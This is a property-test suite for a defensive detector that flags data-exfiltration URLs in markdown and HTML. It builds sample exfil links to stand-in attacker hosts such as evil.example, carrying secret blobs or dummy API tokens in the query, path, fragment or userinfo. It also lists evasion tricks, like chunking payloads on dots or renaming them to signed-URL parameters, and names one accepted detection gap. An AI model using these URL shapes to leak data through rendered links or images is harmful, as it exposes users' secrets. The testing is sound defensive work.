/**
 * Fast-check property tests for Layer 3 (exfil-URL detection).
 *
 * The headline invariant is the THREAT-MODEL promise: a reported threat names
 * the destination `host` and *never* echoes the payload-bearing query, path,
 * fragment, or userinfo. A leak there is the same shape of bug as a passthrough
 * — the output looks fine until you assert the thing it must not contain — so
 * it gets an explicit positive postcondition rather than trusting the inputs to
 * wander onto it. Plus crash-resistance: the detectors run a markdown parser
 * and the WHATWG URL parser on fully untrusted input and must never throw.
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import fc from "fast-check";

import { detectExfil, checkExfilUrl, urlHost } from "../src/html.mjs";
import { fcRunOptions } from "./test-helpers.mjs";

const runOptions = fcRunOptions({ numRuns: 500 });

// A long opaque blob standing in for exfiltrated data. ≥210 chars clears every
// length threshold (path segment > 128, fragment > 200), so all four placement
// positions below reliably produce a flagged threat — keeping the host-no-leak
// property non-vacuous across the whole position space, not just the query case.
const secretBlob = fc
  .array(
    fc.constantFrom(
      ..."ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(
        "",
      ),
    ),
    { minLength: 210, maxLength: 280 },
  )
  .map((chars) => chars.join(""));

const exfilHost = fc.constantFrom(
  "evil.example",
  "beacon.test",
  "a.b.attacker.invalid",
);

// One case carries a single secret through both the doc and the assertion, so
// the host-no-leak check is meaningful: the secret sits in the query/fragment/
// path/userinfo — never the authority — so a correct urlHost returns the bare
// host and a buggy one that echoed any payload-bearing component would fail
// `target === host`. (The earlier independent-secret form was vacuous: a 210+
// char blob can never be a substring of a sub-20-char host regardless of bugs.)
const exfilCase = fc
  .tuple(
    exfilHost,
    secretBlob,
    fc.constantFrom("query", "fragment", "path", "userinfo"),
    fc.constantFrom("md-link", "md-image", "html-a", "html-img"),
  )
  .map(([host, secret, where, kind]) => {
    const url = {
      query: `https://${host}/p?data=${secret}`,
      fragment: `https://${host}/p#${secret}`,
      path: `https://${host}/${secret}`,
      userinfo: `https://user:${secret}@${host}/p`,
    }[where];
    const doc = {
      "md-link": `see [here](${url}) now`,
      "md-image": `look ![alt](${url}) here`,
      "html-a": `<a href="${url}">x</a>`,
      "html-img": `<img src="${url}">`,
    }[kind];
    return { host, doc, where };
  });

const PLACEMENTS = ["query", "fragment", "path", "userinfo"];

describe("property: detectExfil host never echoes the payload", () => {
  it("a flagged threat's target is the bare host, never the payload", () => {
    // Per-PLACEMENT flagged counts, not a single run-wide counter: a run-wide
    // count stays non-zero even if an entire placement (e.g. every `path` case)
    // silently stopped flagging, making the property vacuous for it. Assert each
    // placement flags at least once.
    const flaggedByWhere = Object.fromEntries(PLACEMENTS.map((w) => [w, 0]));
    fc.assert(
      fc.property(exfilCase, ({ host, doc, where }) => {
        const threats = detectExfil(doc) ?? [];
        for (const threat of threats)
          assert.equal(
            threat.target,
            host,
            `target should be the bare host, got ${JSON.stringify(threat.target)}`,
          );
        if (threats.length > 0) flaggedByWhere[where] += 1;
      }),
      runOptions,
    );
    for (const where of PLACEMENTS)
      assert.ok(
        flaggedByWhere[where] > 0,
        `placement "${where}" never flagged — property vacuous there`,
      );
  });
});

// ─── Crash resistance over arbitrary input ───────────────────────────────────

const urlishToken = fc.constantFrom(
  "https://",
  "http://",
  "data:",
  "javascript:",
  "vbscript:",
  "//",
  "?data=",
  "#",
  "@",
  ":",
  "/",
  "user:pw@",
  "${x}",
  "{{y}}",
  ".com",
  "evil.example",
  "AAAA",
  "%ff",
  "\\",
);
const arbitraryUrlish = fc
  .array(fc.oneof(fc.string({ maxLength: 20 }), urlishToken), { maxLength: 12 })
  .map((parts) => parts.join(""));

const docToken = fc.constantFrom(
  "](",
  "![",
  "[ref]: ",
  "<a href=",
  '<img src="',
  "<meta http-equiv=refresh content=",
  '">',
  ")",
  " ",
);
const arbitraryDoc = fc
  .array(fc.oneof(arbitraryUrlish, docToken, fc.string({ maxLength: 20 })), {
    maxLength: 16,
  })
  .map((parts) => parts.join(""));

describe("property: Layer 3 never throws on arbitrary input", () => {
  it("detectExfil returns null or an array of well-formed threats", () => {
    fc.assert(
      fc.property(arbitraryDoc, (doc) => {
        const result = detectExfil(doc);
        assert.ok(result === null || Array.isArray(result));
        for (const threat of result ?? []) {
          assert.equal(typeof threat.isImage, "boolean");
          assert.equal(typeof threat.reason, "string");
          assert.ok(threat.reason.length > 0);
          assert.equal(typeof threat.target, "string");
        }
      }),
      runOptions,
    );
  });

  it("checkExfilUrl returns null or a non-empty reason string", () => {
    fc.assert(
      fc.property(arbitraryUrlish, (url) => {
        const reason = checkExfilUrl(url);
        assert.ok(reason === null || typeof reason === "string");
        if (typeof reason === "string") assert.ok(reason.length > 0);
      }),
      runOptions,
    );
  });

  it("urlHost always returns a string", () => {
    fc.assert(
      fc.property(arbitraryUrlish, (url) => {
        assert.equal(typeof urlHost(url), "string");
      }),
      runOptions,
    );
  });
});

// A payload does not stop being a payload because its author punctuated it, and
// a parameter whose benign value is SHORT must not excuse a long one. Both
// dodges were live: every blob alphabet is anchored over a charset without `.`
// or `,`, so one separator defeated the whole test; and the blob allowlist
// carried the Azure SAS companions (`sv`/`sr`/`se`/`sp`/`st`), whose real values
// are a date, a letter and a timestamp, so `?sr=<blob>` skipped every check.
describe("Layer 3 exfil detection resists punctuation and renames", () => {
  const payload = "QUJDRGVmZ2hJSktMbW5vcFFSU1R1dnd4WVoxMjM0NTY3ODkw".repeat(4);
  const chunk = (s, n) => s.match(new RegExp(`.{1,${n}}`, "g")).join(".");

  it("flags a path payload chunked on dots or commas", () => {
    for (const sep of [".", ","]) {
      const chunked = payload.match(/.{1,10}/g).join(sep);
      assert.equal(
        checkExfilUrl(`https://evil.example/${chunked}`),
        "encoded data blob in path segment",
        `payload chunked on ${JSON.stringify(sep)} went unreported`,
      );
    }
    // Positive marker: the same bytes unbroken are reported too, so the cases
    // above are the chunking being handled and not a threshold accident.
    assert.equal(
      checkExfilUrl(`https://evil.example/${payload}`),
      "encoded data blob in path segment",
    );
  });

  it("accepts the chunked-QUERY residual, so the tradeoff is visible", () => {
    // Pinned as stated behavior, not an oversight. A JWT is natively three
    // dot-separated base64url segments and runs 130-600+ chars, so on a query
    // value no shape or length test separates a chunked payload from an
    // ordinary `?token=<jwt>` — and this repo's detection layer takes the false
    // negative over mangling real content. Anyone tightening this has to change
    // this row deliberately, and must keep `jwt-looking-benign` in
    // test/html-corpus.test.mjs green.
    // Kept under the >200 long-query backstop, which does still catch a bulk
    // chunked query payload — the gap is only the value that stays small.
    const url = `https://evil.example/p?ref=${chunk(payload.slice(0, 100), 12)}`;
    assert.ok(
      new URL(url).search.length < 200,
      "case drifted past the backstop",
    );
    assert.equal(checkExfilUrl(url), null);
  });

  it("flags a blob renamed to a short-valued SAS parameter", () => {
    // Either reason is a correct warning (the blob arm and the credential-token
    // arm both fire on payload-shaped values), so the invariant asserted is that
    // the URL is reported at all — which is exactly what the allowlist suppressed.
    for (const name of ["sv", "sr", "se", "sp", "st", "spr", "si"])
      assert.notEqual(
        checkExfilUrl(`https://evil.example/p?${name}=${payload}`),
        null,
        `?${name}=<blob> went unreported`,
      );
  });

  it("leaves comma-joined identifier lists in a path alone", () => {
    // A batch REST path is a separator-joined list of names, which is the same
    // shape as a chunked payload once rejoined — a ticker list rejoins to a
    // pure-uppercase run and an id list to a pure-digit one, both long enough
    // to clear the 128-char floor. The base64url character mix is what tells
    // them apart from bulk-encoded bytes.
    const tickers = Array.from(
      { length: 30 },
      (_, i) => "ABCD".slice(0, 4) + String.fromCharCode(65 + (i % 26)),
    ).join(",");
    const ids = Array.from({ length: 45 }, (_, i) => String(100 + i)).join(",");
    for (const [label, path] of [
      ["tickers", `v1/quotes/${tickers}`],
      ["ids", `v1/products/${ids}`],
    ]) {
      assert.ok(
        path.length > 128,
        `${label} case is under the floor, so vacuous`,
      );
      assert.equal(
        checkExfilUrl(`https://api.example.com/${path}`),
        null,
        `comma-joined ${label} were reported as a blob`,
      );
    }
  });

  it("leaves a real signed-CDN link and ordinary dotted paths alone", () => {
    const sas =
      "https://acct.blob.core.windows.net/c/b.txt?sv=2021-06-08&sr=b" +
      "&se=2024-01-01T00%3A00%3A00Z&sp=r&sig=" +
      "Ab1".repeat(20);
    assert.equal(checkExfilUrl(sas), null, "real Azure SAS link was reported");
    for (const pkg of [
      "com.example.myapp.service.internal.handler.impl.v2.support.factory",
      "org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration",
      "com.google.common.util.concurrent.ListenableFutureTask.CallbackListener",
    ])
      assert.equal(
        checkExfilUrl(`https://cdn.example.com/${pkg}/main.js`),
        null,
        `dotted package path was reported: ${pkg}`,
      );
    assert.equal(
      checkExfilUrl("https://cdn.example.com/lib/1.2.3.4/lib.min.js"),
      null,
    );
  });
});

// Azure SAS corpus. Shapes are taken from Microsoft's "Create a service SAS",
// "Create an account SAS" and "Create a user delegation SAS" reference pages,
// which enumerate every signed field. Values are same-shape dummies: the `sig`
// keeps a real signature's length (a 44-character base64 HMAC-SHA256, percent
// encoded) and the `skoid`/`sktid`/`saoid`/`suoid`/`scid` keep GUID shape, with
// the secrets themselves replaced. No live credential is committed here.
describe("Layer 3 exfil detection on the Azure SAS taxonomy", () => {
  const SIG = "aB3dE5fG7hI9jK1lM3nO5pQ7rS9tU1vW3xY5zA7bC9c%3D";
  const GUID_A = "0f9d5a3b-1c2e-4a6f-8b7d-2e3f4a5b6c7d";
  const GUID_B = "72f988bf-86f1-41af-91ab-2d7cd011db47";
  const WINDOW =
    "st=2024-01-01T00%3A00%3A00Z&se=2024-01-02T00%3A00%3A00Z&spr=https";

  // Every row's query is longer than the 200-character backstop, so each one
  // exercises the `allParamsBenign` suppression rather than passing under it.
  const legitimate = [
    [
      "service SAS with response-header overrides",
      `https://acct.blob.core.windows.net/c/b.pdf?sv=2022-11-02&sr=b&sp=r&si=readpolicy&sip=168.1.5.60-168.1.5.70&${WINDOW}&rscc=max-age%3D3600&rscd=attachment%3B%20filename%3Dreport.pdf&rsce=gzip&rscl=en-US&rsct=application%2Fpdf&sig=${SIG}`,
    ],
    [
      "account SAS on a container listing",
      `https://acct.blob.core.windows.net/c?restype=container&comp=list&sv=2022-11-02&ss=bfqt&srt=sco&sp=rwdlacupiytfx&${WINDOW}&sip=168.1.5.60-168.1.5.70&sig=${SIG}`,
    ],
    [
      "user-delegation SAS",
      `https://acct.blob.core.windows.net/c/b.txt?sv=2022-11-02&sr=d&sdd=2&sp=r&${WINDOW}&skoid=${GUID_A}&sktid=${GUID_B}&skt=2024-01-01T00%3A00%3A00Z&ske=2024-01-02T00%3A00%3A00Z&sks=b&skv=2022-11-02&sig=${SIG}`,
    ],
    [
      "user-delegation SAS with correlation ids",
      `https://acct.blob.core.windows.net/c/b.txt?sv=2022-11-02&sr=b&sp=r&${WINDOW}&saoid=${GUID_A}&suoid=${GUID_B}&scid=${GUID_A}&skoid=${GUID_A}&sktid=${GUID_B}&sks=b&skv=2022-11-02&sig=${SIG}`,
    ],
    [
      "table SAS with partition and row key ranges",
      `https://acct.table.core.windows.net/mytable?sv=2022-11-02&tn=mytable&sp=raud&${WINDOW}&startpk=customer-a&endpk=customer-z&startrk=000001&endrk=999999&sig=${SIG}`,
    ],
    [
      "blob snapshot and version SAS",
      `https://acct.blob.core.windows.net/c/b.txt?snapshot=2024-01-01T00%3A00%3A00.0000000Z&versionid=2024-01-01T00%3A00%3A00.0000000Z&ses=myscope&sv=2022-11-02&sr=bv&sp=r&${WINDOW}&sig=${SIG}`,
    ],
  ];

  for (const [label, url] of legitimate)
    it(`leaves a real ${label} alone`, () => {
      assert.ok(
        new URL(url).search.length > 200,
        "case is under the long-query backstop, so it proves nothing",
      );
      assert.equal(checkExfilUrl(url), null, `${label} was reported`);
    });

  // The other direction: a signed-field NAME must never excuse a payload-shaped
  // value. `sig` is the one deliberate exception — a real signature and a stolen
  // blob are the same shape, so that dodge is priced in above.
  const payload = "QUJDRGVmZ2hJSktMbW5vcFFSU1R1dnd4WVoxMjM0NTY3ODkw".repeat(4);
  const signedNames = [
    "ss",
    "srt",
    "sip",
    "sdd",
    "ses",
    "skt",
    "ske",
    "sks",
    "skv",
    "skoid",
    "sktid",
    "saoid",
    "suoid",
    "scid",
    "tn",
    "startpk",
    "endpk",
    "startrk",
    "endrk",
    "snapshot",
    "versionid",
    "expires",
    "restype",
    "comp",
    "rscc",
    "rscd",
    "rsce",
    "rscl",
    "rsct",
  ];

  it("flags a blob renamed to any signed SAS parameter", () => {
    for (const name of signedNames)
      assert.notEqual(
        checkExfilUrl(`https://evil.example/p?${name}=${payload}`),
        null,
        `?${name}=<blob> went unreported`,
      );
  });

  it("flags a payload spread across signed names", () => {
    // Each chunk is under the per-value bound and carries no uppercase letter,
    // so no value-shape test fires and only the long-query backstop can catch
    // it — the backstop an all-signed-names query would otherwise suppress.
    const chunk = "abcdef0123_".repeat(10);
    assert.equal(
      checkExfilUrl(`https://evil.example/p?comp=${chunk}&comp=${chunk}`),
      "unusually long query string",
      "a name repeated to carry two chunks went unreported",
    );
    assert.equal(
      checkExfilUrl(
        `https://evil.example/p?comp=${chunk}&tn=${chunk}&restype=${chunk}&si=${chunk}&sip=${chunk}`,
      ),
      "unusually long query string",
      "a chunk per distinct signed name went unreported",
    );
  });

  it("flags an over-long value under a short-valued name", () => {
    // Each chunk stays under the blob bar and carries neither an uppercase
    // letter nor a digit, so only the long-query backstop can catch it — and
    // that backstop is exactly what an all-signed-names query suppresses.
    const slug = "abcdefghij-klmnopqrst_".repeat(9);
    assert.equal(
      checkExfilUrl(`https://evil.example/p?sv=2022-11-02&sr=b&si=${slug}`),
      "unusually long query string",
    );
    // Positive marker: the same query with a real-length policy id is silent,
    // so the row above is the value-length bound and not the name list.
    assert.equal(
      checkExfilUrl(
        `https://acct.blob.core.windows.net/c/b.txt?sv=2022-11-02&sr=b&sp=r&${WINDOW}&si=${slug.slice(0, 120)}&sig=${SIG}`,
      ),
      null,
    );
  });
});
// The same two questions asked of every other signing scheme, not just Azure:
// does a real signed link stay silent, and does a credential in a URL still
// fire? Shapes come from each provider's own presigning reference (AWS SigV4
// and the v2 query auth, CloudFront canned and custom policies, Google Cloud
// Storage V4 and V2, Alibaba OSS, Huawei OBS, Tencent COS, Akamai token auth,
// Firebase Storage). Every signature, key and token value is a same-length
// dummy over the same charset; the documented example key ids (`AKIAIOSFODNN7EXAMPLE`)
// are the ones the vendors publish as examples.
describe("Layer 3 exfil detection across signing schemes", () => {
  const HEX64 =
    "9f8e7d6c5b4a39281706f5e4d3c2b1a00f1e2d3c4b5a69788796a5b4c3d2e1f0";
  const B64SIG = "aB3dE5fG7hI9jK1lM3nO5pQ7rS9tU1vW3xY5zA7bC9c%3D";

  const signed = [
    [
      "AWS SigV4 presigned",
      `https://b.s3.amazonaws.com/k.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIOSFODNN7EXAMPLE%2F20240101%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240101T000000Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=${HEX64}`,
    ],
    [
      "AWS v2 query authentication",
      `https://b.s3.amazonaws.com/k.txt?AWSAccessKeyId=AKIAIOSFODNN7EXAMPLE&Expires=1706000000&Signature=${B64SIG}`,
    ],
    [
      "CloudFront custom policy",
      `https://d111.cloudfront.net/img.png?Policy=${"eyJTdGF0ZW1lbnQ".repeat(8)}&Signature=${"Ab1cD2eF3".repeat(12)}&Key-Pair-Id=APKAIBAERJR2EXAMPLE`,
    ],
    [
      "Google Cloud Storage V2",
      `https://storage.googleapis.com/b/o.txt?GoogleAccessId=svc%40proj.iam.gserviceaccount.com&Expires=1706000000&Signature=${B64SIG}`,
    ],
    [
      "Alibaba OSS",
      `https://b.oss-cn-hangzhou.aliyuncs.com/k?OSSAccessKeyId=LTAI5tExampleKeyId12&Expires=1706000000&Signature=${B64SIG}&x-oss-process=image%2Fresize%2Cw_100`,
    ],
    [
      "Tencent COS",
      `https://b-125.cos.ap-beijing.myqcloud.com/k?q-sign-algorithm=sha1&q-ak=AKIDEXAMPLEaccesskey1234567890&q-sign-time=1706000000%3B1706003600&q-key-time=1706000000%3B1706003600&q-header-list=host&q-url-param-list=&q-signature=${HEX64.slice(0, 40)}`,
    ],
    [
      "Akamai token authentication",
      `https://cdn.example.com/v.m3u8?hdnts=exp%3D1706000000~acl%3D%2F*~hmac%3D${HEX64}`,
    ],
    [
      "Firebase Storage download",
      // A dummy download token, not a credential.
      "https://firebasestorage.googleapis.com/v0/b/p.appspot.com/o/f.png?alt=media&token=0f9d5a3b-1c2e-4a6f-8b7d-2e3f4a5b6c7d", // gitleaks:allow
    ],
  ];

  for (const [label, url] of signed)
    it(`leaves a real ${label} link alone`, () =>
      assert.equal(checkExfilUrl(url), null, `${label} was reported`));

  it("still flags a payload renamed to a key-identifier parameter", () => {
    // The key id names skip the credential arm below the blob floor, never the
    // blob arm — so the exemption cannot be spent on a payload.
    const blob = "QUJDRGVmZ2hJSktMbW5vcFFSU1R1dnd4WVoxMjM0NTY3ODkw".repeat(4);
    for (const name of [
      "AWSAccessKeyId",
      "GoogleAccessId",
      "OSSAccessKeyId",
      "AccessKeyId",
      "Key-Pair-Id",
      "q-ak",
    ])
      assert.notEqual(
        checkExfilUrl(`https://evil.example/p?${name}=${blob}`),
        null,
        `?${name}=<blob> went unreported`,
      );
  });

  // A credential in a URL is the exfil this layer exists to name, whichever
  // vendor minted it. Every token below is a same-shape dummy.
  // The `gitleaks:allow` markers below say the same thing to the secret scan,
  // which reads the shapes and cannot know they were never minted.
  const JWT =
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.Ab1cD2eF3gH4iJ5kL6mN7oP8qR9sT0uV"; // gitleaks:allow
  const leaked = [
    ["GitHub token", "token", `ghp_${"A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"}`],
    ["Anthropic key", "api_key", `sk-ant-api03-${"Ab1cD2eF3g".repeat(9)}`],
    ["Google API key", "apikey", "AIzaSyA1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q"], // gitleaks:allow
    [
      "Slack bot token",
      "auth",
      `xoxb-123456789012-1234567890123-${"Ab1cD2eF3gH4iJ5kL6mN7oP8"}`, // gitleaks:allow
    ],
    ["JWT", "access_token", JWT],
    ["AWS secret key", "secret", "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"],
    ["signed session cookie", "session", `s%3A${"Ab1cD2eF3g".repeat(5)}`],
  ];

  for (const [label, name, value] of leaked)
    it(`flags a ${label} carried in a URL parameter`, () =>
      assert.notEqual(
        checkExfilUrl(`https://evil.example/p?${name}=${value}`),
        null,
        `?${name}=<${label}> went unreported`,
      ));

  it("leaves an ordinary long value in a non-credential parameter alone", () => {
    // The wrapped-credential scan looks INSIDE a value, so it is gated on the
    // parameter name saying credential. A prose parameter keeps the old bar.
    assert.equal(
      checkExfilUrl(
        `https://example.com/p?description=see%20the%20${"Ab1cD2eF3g".repeat(5)}%20build`,
      ),
      null,
    );
  });
});
